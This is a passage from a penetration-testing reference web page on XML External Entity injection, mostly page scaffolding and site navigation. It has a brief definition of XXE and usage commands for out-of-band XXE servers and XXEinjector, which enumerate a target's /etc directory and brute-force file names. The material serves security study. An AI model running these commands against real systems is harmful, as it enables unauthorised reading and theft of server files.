<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="All about xml external entity injection techniques, methods, payloads, how/why/when they work."><meta name=theme-color content="#FFFFFF"><meta name=color-scheme content="light dark"><meta property="og:title" content="XML eXternal Entity Injection"><meta property="og:description" content="All about xml external entity injection techniques, methods, payloads, how/why/when they work."><meta property="og:type" content="article"><meta property="og:url" content="https://www.grayhatfreelancing.com/docs/xxe_injection/"><meta property="article:section" content="docs"><meta property="article:published_time" content="2022-10-16T00:00:00+00:00"><meta property="article:modified_time" content="2023-01-27T03:10:54-05:00"><title>XML eXternal Entity Injection | Gray Hat Freelancing</title><link rel=manifest href=/manifest.json><link rel=icon href=/favicon.png type=image/x-icon><link rel=stylesheet href=/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css integrity="sha256-SzX+0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt+5t7EDugY=" crossorigin=anonymous><script defer src=/flexsearch.min.js></script>
<script defer src=/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2+lMiccGbo=" crossorigin=anonymous></script>
<script defer src=/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js integrity="sha256-b2+Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC+NdcPIvZhzk=" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-5VH24CV5RY"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-5VH24CV5RY",{anonymize_ip:!1})}</script><script type=text/javascript>(function(e,t,n,s,o,i,a){e[o]=e[o]||function(){(e[o].a=e[o].a||[]).push(arguments)},e[o].l=1*new Date;for(var r=0;r<document.scripts.length;r++)if(document.scripts[r].src===s)return;i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)})(window,document,"script","https://mc.yandex.ru/metrika/tag.js","ym"),ym(90832071,"init",{clickmap:!0,trackLinks:!0,accurateTrackBounce:!0,webvisor:!0})</script><noscript><div><img src=https://mc.yandex.ru/watch/90832071 style=position:absolute;left:-9999px alt></div></noscript><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4012275371022894" crossorigin=anonymous></script>
<script async src="https://fundingchoicesmessages.google.com/i/pub-4012275371022894?ers=1" nonce=JP_uCP3IebkCUXDh6KjRmw></script><script nonce=JP_uCP3IebkCUXDh6KjRmw>(function(){function e(){if(!window.frames.googlefcPresent)if(document.body){const e=document.createElement("iframe");e.style="width: 0; height: 0; border: none; z-index: -1000; left: -1000px; top: -1000px;",e.style.display="none",e.name="googlefcPresent",document.body.appendChild(e)}else setTimeout(e,0)}e()})()</script>
<script>(function(){"use strict";if(V=function(e){var t=0;return function(){return t<e.length?{done:!1,value:e[t++]}:{done:!0}}},P="function"==typeof Object.create?Object.create:function(e){var t=function(){};return t.prototype=e,new t},"function"==typeof Object.setPrototypeOf)g=Object.setPrototypeOf;else{a:{N={a:!0},O={};try{O.__proto__=N,k=O.a;break a}catch{}k=!1}g=k?function(e,t){if(e.__proto__=t,e.__proto__!==t)throw new TypeError(e+" is not extensible");return e}:null}var F=g,w=function(e,t){if(e.prototype=P(t.prototype),e.prototype.constructor=e,F)F(e,t);else for(n in t)if("prototype"!=n)if(Object.defineProperties){var n,s=Object.getOwnPropertyDescriptor(t,n);s&&Object.defineProperty(e,n,s)}else e[n]=t[n];e.v=t.prototype},e=this||self,Z=function(){},M=function(e){return e},m=function(e,t){this.g=t===S?e:""};m.prototype.toString=function(){return this.g+""},S={},E=function(t){if(void 0===h){var n=null,s=e.trustedTypes;if(s&&s.createPolicy){try{n=s.createPolicy("goog#html",{createHTML:M,createScript:M,createScriptURL:M})}catch(t){e.console&&e.console.error(t.message)}h=n}else h=n}return t=(n=h)?n.createScriptURL(t):t,new m(t,S)},x=function(){return Math.floor(2147483648*Math.random()).toString(36)+Math.abs(Math.floor(2147483648*Math.random())^Date.now()).toString(36)},C={},r=null,b="function"==typeof Uint8Array;function T(e,t,n){return"object"==typeof e?b&&!Array.isArray(e)&&e instanceof Uint8Array?n(e):D(e,t,n):t(e)}function D(e,t,n){if(Array.isArray(e)){for(var a,o=Array(e.length),s=0;s<e.length;s++)a=e[s],a!=null&&(o[s]=T(a,t,n));return Array.isArray(e)&&e.s&&i(o),o}o={};for(s in e)Object.prototype.hasOwnProperty.call(e,s)&&(a=e[s],a!=null&&(o[s]=T(a,t,n)));return o}function ee(e){return D(e,function(e){return"number"==typeof e?isFinite(e)?e:String(e):e},function(e){if(void 0===n&&(n=0),!r){r={};for(var t,n,s,o,l,d,a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".split(""),c=["+/=","+/","-_=","-_.","-_"],i=0;5>i;i++){t=a.concat(c[i].split("")),C[i]=t;for(s=0;s<t.length;s++)o=t[s],void 0===r[o]&&(r[o]=s)}}n=C[n],a=Array(Math.floor(e.length/3)),c=n[64]||"";for(i=t=0;t<e.length-2;t+=3)l=e[t],d=e[t+1],o=e[t+2],s=n[l>>2],l=n[(l&3)<<4|d>>4],d=n[(d&15)<<2|o>>6],o=n[o&63],a[i++]=""+s+l+d+o;switch(s=0,o=c,e.length-t){case 2:s=e[t+1],o=n[(s&15)<<2]||c;case 1:e=e[t],a[i]=""+n[e>>2]+n[(e&3)<<4|s>>4]+o+c}return a.join("")})}var $={s:{value:!0,configurable:!0}},i=function(e){return Array.isArray(e)&&!Object.isFrozen(e)&&Object.defineProperties(e,$),e},o=function(e,t,n){var s=p;p=null,e||(e=s),s=this.constructor.u,e||(e=s?[s]:[]),this.j=s?0:-1,this.h=null,this.g=e;a:{if(s=this.g.length,e=s-1,s&&(s=this.g[e],!(null===s||"object"!=typeof s||Array.isArray(s)||b&&s instanceof Uint8Array))){this.l=e-this.j,this.i=s;break a}void 0!==t&&-1<t?(this.l=Math.max(t,e+1-this.j),this.i=null):this.l=Number.MAX_VALUE}if(n)for(t=0;t<n.length;t++)e=n[t],e<this.l?(e+=this.j,(s=this.g[e])?i(s):this.g[e]=f):(s=this.l+this.j,this.g[s]||(this.i=this.g[s]={}),(s=this.i[e])?i(s):this.i[e]=f)},f=Object.freeze(i([])),t=function(e,t){if(-1===t)return null;if(t<e.l){t+=e.j;var n=e.g[t];return n!==f?n:e.g[t]=i([])}if(e.i)return n=e.i[t],n!==f?n:e.i[t]=i([])},z=function(e,n){var s,o=L;return-1===n?null:(e.h||(e.h={}),e.h[n]||(s=t(e,n),s&&(e.h[n]=new o(s))),e.h[n])};o.prototype.toJSON=function(){var e=l(this,!1);return ee(e)},l=function(e,t){if(e.h)for(o in e.h)if(Object.prototype.hasOwnProperty.call(e.h,o)){var s,o,n=e.h[o];if(Array.isArray(n))for(s=0;s<n.length;s++)n[s]&&l(n[s],t);else n&&l(n,t)}return e.g},j=function(e,t){return p=t=t?JSON.parse(t):null,e=new e(t),p=null,e},o.prototype.toString=function(){return l(this,!1).toString()},A=function(e){o.call(this,e)},w(A,o);function Q(e){var t,s=(e.ownerDocument&&e.ownerDocument.defaultView||window).document,n=null===(t=s.querySelector)||void 0===t?void 0:t.call(s,"script[nonce]");(t=n?n.nonce||n.getAttribute("nonce")||"":"")&&e.setAttribute("nonce",t)}u=function(e,t){return t=String(t),"application/xhtml+xml"===e.contentType&&(t=t.toLowerCase()),e.createElement(t)},d=function(t){this.g=t||e.document||document},d.prototype.appendChild=function(e,t){e.appendChild(t)};var r,l,d,u,h,p,g,b,j,y,_,O,x,C,E,k,A,S,N,P,V,v=function(e,t,n,s,o,i){try{var r=e.g,a=u(e.g,"SCRIPT");a.async=!0,a.src=t instanceof m&&t.constructor===m?t.g:"type_error:TrustedResourceUrl",Q(a),r.head.appendChild(a),a.addEventListener("load",function(){o(),s&&r.head.removeChild(a)}),a.addEventListener("error",function(){0<n?v(e,t,n-1,s,o,i):(s&&r.head.removeChild(a),i())})}catch{i()}},X=e.atob("aHR0cHM6Ly93d3cuZ3N0YXRpYy5jb20vaW1hZ2VzL2ljb25zL21hdGVyaWFsL3N5c3RlbS8xeC93YXJuaW5nX2FtYmVyXzI0ZHAucG5n"),K=e.atob("WW91IGFyZSBzZWVpbmcgdGhpcyBtZXNzYWdlIGJlY2F1c2UgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlIGlzIGludGVyZmVyaW5nIHdpdGggdGhpcyBwYWdlLg=="),U=e.atob("RGlzYWJsZSBhbnkgYWQgb3Igc2NyaXB0IGJsb2NraW5nIHNvZnR3YXJlLCB0aGVuIHJlbG9hZCB0aGlzIHBhZ2Uu"),W=function(e,t,n){this.h=e,this.j=new d(this.h),this.g=null,this.i=[],this.l=!1,this.o=t,this.m=n},I=function(t){if(t.h.body&&!t.l){var n=function(){B(t),e.setTimeout(function(){return R(t,3)},50)};v(t.j,t.o,2,!0,function(){e[t.m]||n()},n),t.l=!0}},B=function(e){for(var i,r,c,l,t=n(1,5),o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i);t=s(e),t.style.bottom="0",t.style.left="0",t.style.position="fixed",t.style.width=n(100,110).toString()+"%",t.style.zIndex=n(2147483544,2147483644).toString(),t.style["background-color"]=H(249,259,242,252,219,229),t.style["box-shadow"]="0 0 12px #888",t.style.color=H(0,10,0,10,0,10),t.style.display="flex",t.style["justify-content"]="center",t.style["font-family"]="Roboto, Arial",o=s(e),o.style.width=n(80,85).toString()+"%",o.style.maxWidth=n(750,775).toString()+"px",o.style.margin="24px",o.style.display="flex",o.style["align-items"]="flex-start",o.style["justify-content"]="center",i=u(e.j.g,"IMG"),i.className=x(),i.src=X,i.style.height="24px",i.style.width="24px",i.style["padding-right"]="16px",r=s(e),c=s(e),c.style["font-weight"]="bold",c.textContent=K,l=s(e),l.textContent=U,a(e,r,c),a(e,r,l),a(e,o,i),a(e,o,r),a(e,t,o),e.g=t,e.h.body.appendChild(e.g),t=n(1,5);for(o=0;o<t;o++)i=s(e),e.h.body.appendChild(i),e.i.push(i)},a=function(e,t,o){for(var r,i=n(1,5),a=0;a<i;a++)r=s(e),t.appendChild(r);t.appendChild(o),o=n(1,5);for(i=0;i<o;i++)a=s(e),t.appendChild(a)},n=function(e,t){return Math.floor(e+Math.random()*(t-e))},H=function(e,t,s,o,i,a){return"rgb("+n(Math.max(e,0),Math.min(t,255)).toString()+","+n(Math.max(s,0),Math.min(o,255)).toString()+","+n(Math.max(i,0),Math.min(a,255)).toString()+")"},s=function(e){return e=u(e.j.g,"DIV"),e.className=x(),e},R=function(t,n){0>=n||null!=t.g&&0!=t.g.offsetHeight&&0!=t.g.offsetWidth||(q(t),B(t),e.setTimeout(function(){return R(t,n-1)},50))},q=function(e){var t=e.i,n="undefined"!=typeof Symbol&&Symbol.iterator&&t[Symbol.iterator],t=n?n.call(t):{next:V(t)};for(n=t.next();!n.done;n=t.next())(n=n.value)&&n.parentNode&&n.parentNode.removeChild(n);e.i=[],(t=e.g)&&t.parentNode&&t.parentNode.removeChild(t),e.g=null},Y=function(t,n,s,o,i){var a=G(s),c=function(s){s.appendChild(a),e.setTimeout(function(){a?(0!==a.offsetHeight&&0!==a.offsetWidth?n():t(),a.parentNode&&a.parentNode.removeChild(a)):t()},o)},r=function(t){document.body?c(document.body):0<t?e.setTimeout(function(){r(t-1)},i):n()};r(3)},G=function(e){var t=document.createElement("div");return t.className=e,t.style.width="1px",t.style.height="1px",t.style.position="absolute",t.style.left="-10000px",t.style.top="-10000px",t.style.zIndex="-10000",t},L=function(e){o.call(this,e)};w(L,o),_=function(e){o.call(this,e)},w(_,o),y=function(e,n){this.l=e,this.m=new d(e.document),this.g=n,this.i=t(this.g,1),n=z(this.g,2),this.o=E(t(n,4)||""),this.h=!1,n=z(this.g,13),n=E(t(n,4)||""),this.j=new W(e.document,n,t(this.g,12))},y.prototype.start=function(){J(this)};var J=function(n){te(n),v(n.m,n.o,3,!1,function(){a:{var i,s=n.i,o=e.btoa(s);if(o=e[o]){try{i=j(A,e.atob(o))}catch{s=!1;break a}s=s===t(i,1)}else s=!1}s?c(n,t(n.g,14)):(c(n,t(n.g,8)),I(n.j))},function(){Y(function(){c(n,t(n.g,7)),I(n.j)},function(){return c(n,t(n.g,6))},t(n.g,9),t(n.g,10),t(n.g,11))})},c=function(e,t){e.h||(e.h=!0,e=new e.l.XMLHttpRequest,e.open("GET",t,!0),e.send())},te=function(n){var s=e.btoa(n.i);n.l[s]&&c(n,t(n.g,5))};(function(t,n){e[t]=function(){for(var i=[],o=0;o<arguments.length;++o)i[o-0]=arguments[o];e[t]=Z,n.apply(null,i)}})("__h82AlnkH6D91__",function(e){"function"==typeof window.atob&&new y(window,j(_,window.atob(e))).start()})}).call(this),window.__h82AlnkH6D91__("WyJwdWItNDAxMjI3NTM3MTAyMjg5NCIsW251bGwsbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9iL3B1Yi00MDEyMjc1MzcxMDIyODk0Il0sbnVsbCxudWxsLCJodHRwczovL2Z1bmRpbmdjaG9pY2VzbWVzc2FnZXMuZ29vZ2xlLmNvbS9lbC9BR1NLV3hWWTQzNTA3UlV4MlBicWdSRGsxQnFnWnV6Rm5xU3hmTDZsRVcyVDRvSVhTa2QzRlZvQlpra0RHTlRvYmU1dTM5U3k4bFVROGJsNVpxQjlxWGh6Z3FuT1JBXHUwMDNkXHUwMDNkP3RlXHUwMDNkVE9LRU5fRVhQT1NFRCIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFY1V0czR01DdDNLNmVxTDlKQ2NFNnJwU0oxNDVZTjlXOS1SU2tFd3J3NXhMbEROSU1rdVVCcnI2QjJyY3Zia0w0dGNMOEFCV0ZFUy1idzBNWG8zcUdyTUFcdTAwM2RcdTAwM2Q/YWJcdTAwM2QxXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFhfdzJlbk9UVmhhN05TeVAxakR2SkJyMU1MbDhvS0Zpb0N1bm0wVWxFMEdqUGVtVUM1RFpLajFTWGxBYktHUWZWa1lvNWs0RlIzbXdvdktROVA2cWE4cmdcdTAwM2RcdTAwM2Q/YWJcdTAwM2QyXHUwMDI2c2JmXHUwMDNkMSIsImh0dHBzOi8vZnVuZGluZ2Nob2ljZXNtZXNzYWdlcy5nb29nbGUuY29tL2VsL0FHU0tXeFdNTi1PNHpRLUJENU1wakZVNWVjUVdqeGIwNHh5Yzc3akdlOEdwbjZ5VWtiemF3SkxYV3lfQ2xMWWFORVEtWER0cXJ4R1JQMzBpbjNBUnJZTXR2NHlXMWdcdTAwM2RcdTAwM2Q/c2JmXHUwMDNkMiIsImRpdi1ncHQtYWQiLDIwLDEwMCwiY0hWaUxUUXdNVEl5TnpVek56RXdNakk0T1RRXHUwMDNkIixbbnVsbCxudWxsLG51bGwsImh0dHBzOi8vd3d3LmdzdGF0aWMuY29tLzBlbW4vZi9wL3B1Yi00MDEyMjc1MzcxMDIyODk0LmpzP3VzcXBcdTAwM2RDQVEiXSwiaHR0cHM6Ly9mdW5kaW5nY2hvaWNlc21lc3NhZ2VzLmdvb2dsZS5jb20vZWwvQUdTS1d4VnlVcTVpZThXX0JkWFlGNXo3MzhtQjBkMEcxeEFlZ1BPZHp3WGVDdFdvQW5xVVNvWndVdW00UFhMRXNpUEZ1b2oxUUFUN25WNl9XWDdjMEE1X3VacFd2UVx1MDAzZFx1MDAzZCJd")</script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><img src=/logo.png alt=Logo><span>Gray Hat Freelancing</span></a></h2><div class=book-search><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><ul><li><a href=/docs/insecure_file_uploads/>Insecure File Upload</a></li><li><a href=/docs/web_cache_deception/>Web Cache Deception</a></li><li><a href=/docs/xss_injection/>XSS Injection</a></li><li><a href=/docs/java_rmi/>Java RMI</a></li><li><a href=/docs/json_web_token/>JSON Web Tokens</a></li><li><a href=/docs/server_side_request_forgery/>Server-Side Request Forgery</a></li><li><a href=/docs/escape_breakout/>Application Escape and Breakout</a></li><li><a href=/docs/csv_injection/>Csv Injection</a></li><li><a href=/docs/checking_for_account_takeover/>Account Takeovers</a></li><li><a href=/docs/cobalt_strike_all_you_need/>Cobalt Strike</a></li><li><a href=/docs/cve_exploits/>CVE Exploits</a></li><li><a href=/docs/dns_rebinding/>DNS Rebinding</a></li><li><a href=/docs/docker_pentesting/>Docker Security</a></li><li><a href=/docs/file_inclusion/>File Inclusion</a></li><li><a href=/docs/insecure_direct_object_references/>Insecure Direct Object References</a></li><li><a href=/docs/kuburnetes/>Kuburnetes</a></li><li><a href=/docs/attacking_active_directory/>Active Directory Attacks</a></li><li><a href=/docs/amazon_aws_s3_buckets/>Amazon AWS S3 Buckets</a></li><li><a href=/docs/api_key_leaks/>API Key Leaks</a></li><li><a href=/docs/argument_injection/>Argument Injection</a></li><li><a href=/docs/command_injection/>Command Injection</a></li><li><a href=/docs/cors_misconfigurations/>CORS Misconfigurations</a></li><li><a href=/docs/csrf_injection/>CSRF Injection</a></li><li><a href=/docs/directory_traversal/>Directory Traversal</a></li><li><a href=/docs/network_discovery/>Network Discovery</a></li><li><a href=/docs/insecure_deserialization/python/>Python Deserialization</a></li><li><a href=/docs/insecure_deserialization/ruby/>Ruby Deserialization</a></li><li><a href=/docs/web_sockets/>Web Sockets Attacks</a></li><li><a href=/docs/insecure_deserialization/yaml/>YAML Deserialization</a></li><li><a href=/docs/insecure_deserialization/dotnet/>.NET Insecure Deserialization</a></li><li><a href=/docs/exercism_solutions/>Exercism Solutions</a></li><li><a href=/docs/insecure_deserialization/>Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/node/>Node Insecure Deserialization</a></li><li><a href=/docs/insecure_deserialization/php/>PHP Insecure Deserialization</a></li><li><a href=/docs/crlf_injection/>CRLF Injection</a></li><li><a href=/docs/insecure_deserialization/java/>Insecure Deserialization - Java</a></li><li><a href=/docs/brute_force_cracking/>Brute Force Cracking</a></li><li><a href=/docs/training_grounds/>Training Grounds</a></li><li><a href=/docs/wordpress/>Wordpress Security</a></li><li><a href=/docs/windows_hardening/>Windows - Hardening</a></li><li><a href=/docs/windows_amsi_bypass/>Bypassing AMSI protections</a></li><li><a href=/docs/subdomains_enumeration/>Enumerating Subdomains</a></li><li><a href=/docs/windows_mimikatz/>Windows - Mimikatz</a></li><li><a href=/docs/windows_persistence/>Windows - Persistence</a></li><li><a href=/docs/windows_privilege_escalation/>Windows - Privilege Escalation</a></li><li><a href=/docs/windows_using_credentials/>Windows - Using Credentials</a></li><li><a href=/docs/windows_download_and_execute/>Windows Download and Execute Methods</a></li><li><a href=/docs/office_attacks/>Attacking Office</a></li><li><a href=/docs/bind_shell_cheatsheet/>Bind Shell Cheatsheet</a></li><li><a href=/docs/methodology_and_enumeration/>Bug Hunting Methodology and Enumeration</a></li><li><a href=/docs/hash_cracking/>Hash Cracking Cheatsheet</a></li><li><a href=/docs/linux_persistence/>Linux - Persistence</a></li><li><a href=/docs/linux_privilege_escalation/>Linux - Privilege Escalation</a></li><li><a href=/docs/metasploit_cheatsheet/>Metasploit</a></li><li><a href=/docs/windows_dpapi/>Microsoft Window's Data Protection API</a></li><li><a href=/docs/microsoft_azure_cloud/>Microsoft's Azure Cloud</a></li><li><a href=/docs/network_pivoting_techniques/>Network Pivoting Cheatsheet</a></li><li><a href=/docs/mssql_server_cheatsheet/>Pentesting MSSQL Server Cheatsheet</a></li><li><a href=/docs/powershell_cheatsheet/>Powershell Cheatsheet</a></li><li><a href=/docs/reverse_shell_cheatsheet/>Reverse Shell Cheatsheet</a></li><li><a href=/docs/source_code_management/>Source Code Management</a></li><li><a href=/docs/miscellaneous_tricks/>Miscellaneous Tips and Tricks</a></li><li><a href=/docs/dependency_confusion_attacks/>Dependency Confusion</a></li><li><a href=/docs/http_parameter_pollution/>HTTP Parameter Pollution</a></li><li><a href=/docs/insecure_management_interfaces/>Insecure Management Interface</a></li><li><a href=/docs/insecure_source_code_management/>Insecure Source Code Management</a></li><li><a href=/docs/latex_injection/>LaTeX Injection</a></li><li><a href=/docs/ldap_injection/>LDAP Injection</a></li><li><a href=/docs/nosql_injection/>NoSQL Injection</a></li><li><a href=/docs/oauth/>OAuth</a></li><li><a href=/docs/open_url_redirection/>Open URL Redirection</a></li><li><a href=/docs/race_conditions/>Race Conditions</a></li><li><a href=/docs/request_smuggling/>Request Smuggling</a></li><li><a href=/docs/saml_injection/>SAML Injection</a></li><li><a href=/docs/server_side_template_injection/>Server-Side Template Injection</a></li><li><a href=/docs/sql_injection/>SQL Injection</a></li><li><a href=/docs/tabnabbing/>Tabnabbing</a></li><li><a href=/docs/type_juggling/>Type Juggling</a></li><li><a href=/docs/xxe_injection/ class=active>XML eXternal Entity Injection</a></li><li><a href=/docs/xpath_injection/>XPATH Injection</a></li><li><a href=/docs/xslt_injection/>XSLT Injection</a></li><li><a href=/docs/cve_exploits/apache-struts-2-cve-2013-2251-cve-2017-5638-cve-2018-11776/>Apache Struts 2 Cve 2013 2251 Cve 2017 5638 Cve 2018 11776</a></li><li><a href=/docs/cve_exploits/apache-struts-cve-2017-9805-struts-pwn/>Apache Struts Cve 2017 9805 Struts Pwn</a></li><li><a href=/docs/cve_exploits/apache-struts-cve-2018-11776-struts-pwn/>Apache Struts Cve 2018 11776 Struts Pwn</a></li><li><a href=/docs/cve_exploits/citrix-cve-2019-19781/>Citrix Cve 2019 19781</a></li><li><a href=/docs/cve_exploits/docker-api-rce/>Docker API Rce</a></li><li><a href=/docs/cve_exploits/drupalgeddon2-cve-2018-7600/>Drupalgeddon2 Cve 2018 7600</a></li><li><a href=/docs/cve_exploits/heartbleed-cve-2014-0160/>Heartbleed Cve 2014 0160</a></li><li><a href=/docs/cve_exploits/jboss-cve-2015-7501/>Jboss Cve 2015 7501</a></li><li><a href=/docs/cve_exploits/jenkins-cve-2015-8103/>Jenkins Cve 2015 8103</a></li><li><a href=/docs/cve_exploits/jenkins-cve-2016-0792/>Jenkins Cve 2016 0792</a></li><li><a href=/docs/cve_exploits/jenkins-groovy-console/>Jenkins Groovy Console</a></li><li><a href=/docs/cve_exploits/log4shell/>Log4 Shell</a></li><li><a href=/docs/cve_exploits/rails-cve-2019-5420/>Rails Cve 2019 5420</a></li><li><a href=/docs/cve_exploits/shellshock-cve-2014-6271/>Shellshock Cve 2014 6271</a></li><li><a href=/docs/cve_exploits/telerik-cve-2017-9248/>Telerik Cve 2017 9248</a></li><li><a href=/docs/cve_exploits/telerik-cve-2019-18935/>Telerik Cve 2019 18935</a></li><li><a href=/docs/cve_exploits/tomcat-cve-2017-12617/>Tomcat Cve 2017 12617</a></li><li><a href=/docs/cve_exploits/vbulletin-rce-5.0.0-5.5.4/>V Bulletin Rce 5.0.0 5.5.4</a></li><li><a href=/docs/cve_exploits/weblogic-cve-2016-3510/>Web Logic Cve 2016 3510</a></li><li><a href=/docs/cve_exploits/weblogic-cve-2017-10271/>Web Logic Cve 2017 10271</a></li><li><a href=/docs/cve_exploits/weblogic-cve-2018-2894/>Web Logic Cve 2018 2894</a></li><li><a href=/docs/cve_exploits/websphere-cve-2015-7450/>Web Sphere Cve 2015 7450</a></li><li><a href=/docs/graphql_injection/>GraphQL Injection</a></li></ul><ul><li><a href=/posts/>Blog</a></li><li><a href=https://github.com/m00tiny/ target=_blank rel=noopener>Github</a></li><li><a href=https://github.com/m00tiny/grayhatfreelancing target=_blank rel=noopener>Contribute</a></li></ul></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label>
<strong>XML eXternal Entity Injection</strong>
<label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents><ul><li><a href=#xml-external-entity>XML External Entity</a><ul><li><a href=#tools>Tools</a></li><li><a href=#detect-the-vulnerability>Detect the vulnerability</a></li><li><a href=#exploiting-xxe-to-retrieve-files>Exploiting XXE to retrieve files</a><ul><li><a href=#classic-xxe>Classic XXE</a></li><li><a href=#classic-xxe-base64-encoded>Classic XXE Base64 encoded</a></li><li><a href=#php-wrapper-inside-xxe>PHP Wrapper inside XXE</a></li><li><a href=#xinclude-attacks>XInclude attacks</a></li></ul></li><li><a href=#exploiting-xxe-to-perform-ssrf-attacks>Exploiting XXE to perform SSRF attacks</a></li><li><a href=#exploiting-xxe-to-perform-a-deny-of-service>Exploiting XXE to perform a deny of service</a><ul><li><a href=#billion-laugh-attack>Billion Laugh Attack</a></li><li><a href=#yaml-attack>Yaml attack</a></li></ul></li><li><a href=#error-based-xxe>Error Based XXE</a></li><li><a href=#exploiting-blind-xxe-to-exfiltrate-data-out-of-band>Exploiting blind XXE to exfiltrate data out-of-band</a><ul><li><a href=#blind-xxe>Blind XXE</a></li><li><a href=#xxe-oob-attack>XXE OOB Attack</a></li><li><a href=#xxe-oob-with-dtd-and-php-filter>XXE OOB with DTD and PHP filter</a></li><li><a href=#xxe-oob-with-apache-karaf>XXE OOB with Apache Karaf</a></li></ul></li><li><a href=#xxe-with-local-dtd>XXE with local DTD</a></li><li><a href=#windows-local-dtd-and-side-channel-leak-to-disclose-http-responsefile-contents>Windows Local DTD and Side Channel Leak to disclose HTTP response/file contents</a><ul><li><a href=#disclose-local-file>Disclose local file</a></li><li><a href=#disclose-http-response>Disclose HTTP Response:</a></li></ul></li><li><a href=#xxe-in-exotic-files>XXE in exotic files</a><ul><li><a href=#xxe-inside-svg>XXE inside SVG</a></li><li><a href=#xxe-inside-soap>XXE inside SOAP</a></li><li><a href=#xxe-inside-docx-file>XXE inside DOCX file</a></li><li><a href=#xxe-inside-xlsx-file>XXE inside XLSX file</a></li><li><a href=#xxe-inside-dtd-file>XXE inside DTD file</a></li><li><a href=#xxe-waf-bypass-via-convert-character-encoding>XXE WAF Bypass via convert character encoding</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></aside></header><article class=markdown><h1 id=xml-external-entity>XML External Entity
<a class=anchor href=#xml-external-entity>#</a></h1><blockquote><p>An XML External Entity attack is a type of attack against an application that parses XML input and allows XML entities. XML entities can be used to tell the XML parser to fetch specific content on the server.</p></blockquote><p><strong>Internal Entity</strong>: If an entity is declared within a DTD it is called as internal entity.<br>Syntax: <code>&lt;!ENTITY entity_name "entity_value"></code></p><p><strong>External Entity</strong>: If an entity is declared outside a DTD it is called as external entity. Identified by <code>SYSTEM</code>.<br>Syntax: <code>&lt;!ENTITY entity_name SYSTEM "entity_value"></code></p><h2 id=tools>Tools
<a class=anchor href=#tools>#</a></h2><ul><li><a href=https://github.com/staaldraad/xxeserv>xxeftp</a> - A mini webserver with FTP support for XXE payloads<pre tabindex=0><code>sudo ./xxeftp -uno 443
./xxeftp -w -wps 5555
</code></pre></li><li><a href=https://github.com/lc/230-OOB>230-OOB</a> - An Out-of-Band XXE server for retrieving file contents over FTP and payload generation via <a href=http://xxe.sh/>http://xxe.sh/</a><pre tabindex=0><code>$ python3 230.py 2121
</code></pre></li><li><a href=https://github.com/enjoiz/XXEinjector>XXEinjector</a> - Tool for automatic exploitation of XXE vulnerability using direct and different out of band methods<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Enumerating /etc directory in HTTPS application:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --path<span style=color:#f92672>=</span>/etc --file<span style=color:#f92672>=</span>/tmp/req.txt --ssl
</span></span><span style=display:flex><span><span style=color:#75715e># Enumerating /etc directory using gopher for OOB method:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --path<span style=color:#f92672>=</span>/etc --file<span style=color:#f92672>=</span>/tmp/req.txt --oob<span style=color:#f92672>=</span>gopher
</span></span><span style=display:flex><span><span style=color:#75715e># Second order exploitation:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --path<span style=color:#f92672>=</span>/etc --file<span style=color:#f92672>=</span>/tmp/vulnreq.txt --2ndfile<span style=color:#f92672>=</span>/tmp/2ndreq.txt
</span></span><span style=display:flex><span><span style=color:#75715e># Bruteforcing files using HTTP out of band method and netdoc protocol:</span>
</span></span><span style=display:flex><span>ruby XXEinjector.rb --host<span style=color:#f92672>=</span>192.168.0.2 --brute<span style=color:#f92672>=</span>/tmp/filenames.txt --file<span style=color:#f92672>=</span>/tmp/req.txt --oob<span style=color:#f92672>=</span>http --netdoc
